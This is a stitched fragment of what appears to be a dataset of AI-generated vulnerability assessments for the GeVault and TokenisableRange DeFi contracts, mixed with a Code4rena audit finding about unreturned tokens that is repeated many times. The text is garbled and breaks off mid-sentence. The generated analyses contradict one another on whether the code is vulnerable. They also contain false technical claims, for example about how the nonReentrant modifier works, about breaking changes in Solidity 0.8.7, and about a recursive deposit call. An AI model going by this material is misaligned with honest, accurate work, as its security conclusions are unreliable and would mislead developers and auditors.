The following reasons explain why:\n\nFirstly, the `deposit` function in the smart contract code only allows a user to deposit a specific amount of liquidity tokens (n0 and n1) into the pool by transferring them from their account to the pool's address through the `transferFrom` function. The `safeIncreaseAllowance` function is called to allow the pool to mint the specified amount of liquidity tokens.\n\nSecondly, the code validates that the user-specified minimum amount of LP tokens to mint by checking if the amount they want to deposit meets the required minimum amounts. If the amounts do not meet the requirements, the transaction is reverted.\n```csharp\nrequire(n0 * fee0 / (token0Amount + fee0) >= n0 * 95 / 100 && n1 * fee1 / (token1Amount + fee1) >= n1 * 95 / 100, \"Insufficient LP amount for deposit\");\n```\nLastly, the `increaseLiquidity` function in the smart contract code only allows a user to mint new liquidity tokens if the required amounts are met. Therefore, even if a frontrunner manipulates the pool's reserves, the transaction will be reverted if it does not meet the minimum amount of LP tokens specified by the user.\n```csharp\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n  INonfungiblePositionManager.IncreaseLiquidityParams({\n    tokenId: tokenId,\n    amount0Desired: n0,\n    amount1Desired: n1,\n    amount0Min: n0 * 95 / 100,\n    amount1Min: n1 * 95 / 100,\n    deadline: block.timestamp\n  })\n);\n```\nTherefore, the given smart contract code is not vulnerable to the front-running vulnerability mentioned in the given vulnerability knowledge because it validates the user",
                "poc_patch": "  This smart contract appears to have several vulnerabilities, but the most likely vulnerability I can identify is the front-running issue you mentioned earlier. Here's how:\n\n1. The `deposit()` function allows anyone to mint liquidity tokens by sending assets (token0 and token1) into the pool.\n2. However, there's no validation of the liquidity amount that the user will receive in return. This means that a frontrunner can manipulate the price of the assets in the pool before the user deposits their liquidity.\n3. The front-runner can then sell the assets at a lower price, causing the user to receive fewer liquidity tokens than expected.\n4. To mitigate this vulnerability, developers should implement a user-specified minimum amount of liquidity tokens that the contract will mint. This would enforce stricter constraints on adding liquidity to the pool and prevent frontrunners from exploiting the vulnerability.\n\nThere are several other issues with the smart contract as well:\n\n1. The `claimFee()` function has no validation of the fee amount that is being claimed. This means that a user can potentially claim more fees than they should, which could lead to a loss of value for the pool's users.\n2. The `POS_MGR.increaseLiquidity()` function has no validation of the liquidity amount that is being added to the pool. This means that if the user sends in an incorrect amount of assets, it could cause issues with the pool's liquidity and asset balances.\n3. There are several unsafe operations in the smart contract, such as using `safeIncreaseAllowance` without checking for a revert condition and using `require` statements without handling potential reverts. These can lead to a loss of value for the pool's users if not handled correctly.\n4. The smart contract does not have any mechanism for updating the liquidity reserves in case of changes in the asset prices or other external factors that could affect the pool's liquidity levels.\n\nOverall, while the smart contract appears to be well-written and has several security measures in place, it still has some vulnerabilities that need to be addressed to ensure the safety and security of the pool's users.",

If the reentrancy attack is successful, then it will cause a recursive call to `deposit()`, leading to an infinite loop of deposits and a loss of funds for the liquidity provider.\n\nHere's why this happens: when a user calls the `deposit()` function, it first calls `claimFee()`. This triggers the execution of `POS_MGR.increaseLiquidity()`, which in turn calls `POS_MGR.deposit()`. The `POS_MGR.deposit()` function then calls back to the original `deposit()` function, creating a recursive call.\n\nThis can be avoided by using the `nonReentrant` modifier, which is used to prevent reentrancy attacks in the Solidity programming language. This modifier works by checking if the current transaction has already been executed, and if so, it throws an error. By adding this modifier to the `deposit()` function, we can ensure that the function cannot be called more than once during a single transaction.\n\nIn summary, the `deposit()` function is vulnerable to a reentrancy attack due to the recursive call to `POS_MGR.increaseLiquidity()`, which in turn calls `POS_MGR.deposit()`.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

In the given smart contract code, there are several arithmetic operations that contribute to this vulnerability. For example:\n\n1. The calculation for `valueX8` is performed using integer division (`/`) instead of a fixed-point library or other more precise mathematical library. This can lead to rounding errors and inaccuracies when working with non-integer values.\n2. The calculation for `fee` uses the result of `getAdjustedBaseFee`, which is also an integer division operation, but with a denominator that is much larger than 100. This can lead to a situation where the fee is not accurately calculated and may cause errors in subsequent calculations.\n3. The calculation for `bal` uses the result of `amount - fee`, which is again an integer division operation that could lead to rounding errors.\n4. Finally, the withdrawal amount is sent to the user via a transfer function, which can also introduce potential vulnerabilities if the transfer fails or does not accurately reflect the intended amount.\n\nIn conclusion, based on the given vulnerability knowledge and review of the smart contract code provided, it appears that the code is indeed vulnerable to the \"Arithmetic Vulnerability\" described.

It then calculates the fee using the `getAdjustedBaseFee` function and subtracts it from the amount to withdraw.\n5. The contract then burns the sender's tokens, removes them from all ticks, transfers the fee to the treasury, and withdraws the remainder of the amount to be withdrawn to the sender.\n6. If the pool is enabled, it deploys assets in ticks using the `deployAssets` function.\n7. Finally, it emits a `Withdraw` event with the sender's address, the token they are withdrawing, the amount withdrawn, and the liquidity they had before withdrawing.\n\nThe vulnerability arises from the fact that the contract does not properly handle small amounts of liquidity deposited and attributions during the calculation of new liquidity provider shares. If an attacker transfers a large amount of attributions to the pool after depositing a small amount, they can manipulate the shares obtained by other liquidity providers. For example, if an attacker deposits 0.0001 ETH and then transfers 99.9999 ETH to the pool, their share of the pool will be rounded down to zero due to the small initial liquidity provided. When another liquidity provider tries to withdraw from the pool, their amount may also round",

The most likely type of vulnerability is a reentrancy attack, which can cause asset loss or compromise the pool's integrity.\n\nThe reason for this vulnerability is that the withdraw function has two nested require statements: one requiring that the balance of the caller be greater than or equal to the amount they wish to withdraw (line 3), and another requiring that the amount they wish to withdraw be greater than zero (line 5). However, these requirements are not properly enforced. Specifically, if a liquidity provider has deposited a small amount of liquidity in exchange for a large number of shares, the pool's total supply of tokens will be increased by a significant amount relative to the actual amount of liquidity provided. This can cause the withdraw function to round down the amount of shares that the liquidity provider receives when they attempt to withdraw their deposit (line 7), effectively allowing an attacker to steal funds from other liquidity providers.\n\nTo fix this vulnerability, it would be necessary to modify the withdraw function to ensure that the amount of shares received by a liquidity provider does not exceed the actual amount of liquidity provided during the deposit (e.g., by checking whether the total supply of tokens has been increased beyond what is expected). Alternatively, the pool could be designed with a different mechanism for handling small liquidity deposits, such as by requiring that a minimum amount of liquidity be deposited before any withdrawals can occur.",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function.

These operations can potentially cause underflow or overflow, depending on the input values and the contract implementation.\n\nSecondly, in the code, we see that there is a check for zero `totalSupply()`, which suggests that the contract relies on the correct functioning of arithmetic operations to determine its output value. This means that any vulnerabilities in these operations can impact the correct functioning of the contract and cause issues in other parts of the system that rely on it.\n\nBased on these observations, I conclude that the code is likely to be vulnerable to Arithmetic Underflow/Overflow Due to Breaking Changes in Solidity v0.8.0. Specifically, the addition operation in the `getValuePerLPAtPrice()` function can cause underflow or overflow, which can lead to incorrect calculation of the token prices and impact the correct functioning of the contract. The vulnerability is likely to be more pronounced when the contract uses Solidity version >= 0.8.7, as this version has introduced breaking changes that can cause issues with arithmetic operations.",

This means that there is no way for the contract to overflow or underflow during the calculation of the `totalValue` variable.\n\nAdditionally, the variables `amt0`, `amt1`, `TOKEN0_PRICE`, and `TOKEN1_PRICE` are all declared as `uint256`, which means they cannot hold negative values.

However, the `returnExpectedBalance` function does not accurately reflect the share price's involvement in the calculation, which can lead to an incorrect withdrawal amount when the contract attempts to exit the pool and retrieve a particular token. This miscalculation occurs because the withdrawal amount is scaled down by a factor derived from the pool's share price instead of directly using the intended withdrawal amount.\n\nAs pools can operate with different mechanisms for share representation, the share-based withdrawal request must reflect the equivalent token amount accurately. However, in this vulnerable scenario, the share price's involvement in the calculation causes a discrepancy between the user's intended withdrawal amount and the scaled amount used in the request. This gap may lead to a situation where not enough tokens are withdrawn to meet the user's needs, which can trigger a subsequent operation to fail if it relies on the assumption that the required token quantity is available post-withdrawal.\n\nTo mitigate this vulnerability, the `getValuePerLPAtPrice` function should be modified to omit the inappropriate scaling factor and instead use the actual token amount needed, taking into account the pool's share allocation and redemption mechanism without unnecessary adjustments that dilute the amount.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

In this case, the vulnerability arises from the fact that the \"Deposit\" function can be called multiple times in quick succession, which creates a race condition.\n\nThe vulnerability is caused by the fact that the \"Deposit\" function updates the state of the smart contract by calling the \"_mint\" and \"safeTransfer\" functions. However, these functions are not atomic, meaning that they can be interrupted by other transactions on the blockchain. If an attacker calls the \"Deposit\" function multiple times in quick succession, it is possible for them to manipulate the state of the smart contract by using the intermediary balance of the liquidity pool.\n\nFor example, an attacker could deposit a large amount of tokens as \"donation\" into a newly created liquidity pool, causing users who deposit smaller amounts to receive zero shares in return.

If the attacker has already added a disproportionately large amount of tokens to the pool and the subsequent depositor's amount is significantly smaller, this would result in a very small number of shares that gets rounded down to zero.

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

However, the `getTickBalance()` function is called to retrieve the balance of each token in the `ticks` array, which is not stored directly in storage but rather computed based on the current block state and the previous block state.\n\nTherefore, even if an attacker attempts to manipulate the total supply of a token by using a flash loan, the calculation of the TVL will still be accurate because it is derived from the current block state and the previous block state, which are not directly accessible to an attacker.

This would prevent an attacker from manipulating the total supply and ensure accurate calculations of the TVL.

This function is not marked as `view`, and it modifies the state of the contract by updating the balance of each token in the array. The vulnerability arises from the fact that the nested call to `latestAnswer()` can be re-entered during execution of the `getTVL()` function, leading to a race condition where the balance of one or more tokens is updated multiple times, causing unexpected behavior and potentially leading to a loss of funds.\n\nHere's a step-by-step analysis of the vulnerability:\n\n1. The `getTVL()` function starts by iterating over an array of `TokenisableRange` objects using a loop with a counter variable `k`.\n2. For each object in the array, it retrieves its current balance using the `getTickBalance(k)` function.\n3. It then calls the nested `latestAnswer()` function on each object to retrieve its latest answer value. This function is not marked as `view`, so it can modify the state of the contract by updating the balance of each token in the array.\n4. The `latestAnswer()` function updates the balance of each token in the array, which can lead to unexpected behavior and potentially a loss of funds if the update occurs during execution of another smart contract or user transaction.\n5. The `getTVL()` function then adds the latest answer values for each token to the total value locked (TVL) using the formula `valueX8 += bal * t.latestAnswer() / 1e18`.\n6. Finally, it returns the updated TVL value as a result of the function.\n\nTo mitigate this vulnerability, the `latestAnswer()` function should be marked as `view` to prevent reentrancy attacks, or the code should be refactored to avoid nested calls that can lead to race conditions.",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to a reentrancy attack. The reason for this is that the `getTVL()` function uses a loop to iterate over all tickers in the `ticks` array and retrieve their latest answers using the `latestAnswer()` function. However, this function does not check if the current ticker's answer has changed since the last time it was retrieved, which can lead to an attacker calling the `deposit()` or `withdraw()` functions while looping over the tickers in the array.\n\nThe reentrancy attack works as follows:\n1. The attacker calls the `deposit()` function and passes a large amount of tokens to be deposited. This triggers an update of the TVL, but the attacker's deposit is not included in the updated TVL value.\n2. During the loop over the tickers in the `getTVL()` function, the attacker calls the `deposit()` or `withdraw()` functions for multiple times, each time passing a different amount of tokens to be deposited/withdrawn. The total amount of tokens that the attacker has deposited is not included in the updated TVL value, so the attacker can withdraw a larger share of the new TVL that includes both their initial deposit and a share of the accrued interest.\n3. After looping over all tickers in the `getTVL()` function, the attacker's total deposited amount is calculated based on the outdated information. The attacker can withdraw a larger share of the new TVL that includes both their initial deposit and a share of the accrued interest.\n\nTo mitigate this vulnerability, it is recommended to update the TVL before depositing and withdrawing tokens. This can be done by updating the `getTVL()` function to check if any of the tickers' answers have changed since they were last retrieved during the previous loop iteration. If any answer has changed, the updated answer should be used to calculate the new TVL value.",

The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in halves](https://github.com/code-423n4/2023-08-goodentry/blob/4b785d455fff04629d8675f21ef1d1632749b252/contracts/GeVault.sol#L353-L358)), there's always a chance that the `TokenisableRange.deposit()` function won't consume all specified tokens and will return some of them to the `GeVault` contract. However, `GeVault` won't return the unused tokens to the depositor.\n\nMoreover, the contract won't include them in the TVL calculation:\n1. The  function computes the total LP token balance of the contract (`getTickBalance(k)`) and the price of each LP token (`t.latestAnswer()`), to compute the total value of the vault.\n1. The  function won't count the unused tokens because it only returns the amount of LP tokens deposited into the lending pool. I.e. only the liquidity deposited to Uniswap pools is counted.\n1. The  function computes the total value ( of the liquidity deposited into the Uniswap pool (. Thus, the unused tokens won't be counted here as well.\n1. The  function is used to compute the amount of tokens to return to the depositor during withdrawal.\n\nThus, the unused tokens will be locked in the contract until they're deposited into ticks. However, rebalancing and depositing of tokens can result in new unused tokens that won't be counted in the TVL.\n\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nIn the `GeVault.deposit()` function, consider returning unspent tokens to the depositor. Extra testing is needed to guarantee that rebalancing doesn't result in unspent tokens, or, alternatively, such tokens could be counted in a storage variable and excluded from the balance of unspent tokens during depositing.\nAlternatively, consider counting `GeVault`'s token balances in the `getTVL()` function. This won't require returning unspent tokens during depositing and will allow depositors to withdraw their entire funds.\n\n\n## Assessed type\n\nToken-Transfer",

There's always a chance of such event since Uniswap pools take balanced token amounts when liquidity is added but `GeVault` doesn't pre-compute balanced amounts. As a result, depositing and withdrawing can result in a partial loss of funds.\n## Proof of Concept\nThe  function is used by users to deposits funds into ticks and underlying Uniswap pools. The function takes funds from the caller and calls `rebalance()` to distribute the funds among the ticks. The  function first removes liquidity from all ticks and then deposits the removed assets plus the user assets back in to the ticks:\n```solidity\nfunction rebalance() public {\n    require(poolMatchesOracle(), \"GEV: Oracle Error\");\n    removeFromAllTicks();\n    if (isEnabled) deployAssets();\n}\n```\n\nThe `GeVault.deployAssets()` function calls the  function, which actually deposits tokens into a `TokenisableRange` contract by calling the . The function deposits tokens into a Uniswap V3 pool and returns unspent tokens to the caller:\n```solidity\n(uint128 newLiquidity, uint256 added0, uint256 added1) = POS_MGR.increaseLiquidity(\n    ...\n);\n\n...\n\n_mint(msg.sender, lpAmt);\nTOKEN0.token.safeTransfer( msg.sender, n0 - added0);\nTOKEN1.token.safeTransfer( msg.sender, n1 - added1);\n```\n\nHowever, the `GeVault.depositAndStash()` function doesn't handle the returned unspent tokens. Since Uniswap V3 pools take balanced token amounts (respective to the current pool price) and since the funds deposited into ticks are not balanced ([`deployAssets()` splits token amounts in 